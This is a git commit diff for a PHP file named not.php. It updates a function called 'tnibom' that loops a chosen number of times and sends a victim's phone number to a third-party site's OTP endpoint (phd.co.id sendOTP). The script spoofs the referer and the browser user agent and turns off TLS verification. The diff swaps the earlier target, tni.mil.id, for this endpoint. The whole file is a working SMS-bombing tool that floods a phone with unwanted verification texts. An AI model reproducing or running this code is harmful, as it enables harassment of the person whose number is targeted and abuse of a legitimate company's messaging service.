0448c8313945c384cd54b87ddd7bb59b7cf99012
nonamer00t <34794375+nonamer00t@users.noreply.github.com>
2017-12-23 22:31:35 +0700

    Update not.php

--- not.php
+++ not.php
@@ -3,14 +3,14 @@ function tnibom($no, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,"http://tni.mil.id");
+        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_REFERER, 'http://tni.mil.id/contact.html');
+        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
         $server_output = curl_exec ($ch);
         curl_close ($ch);
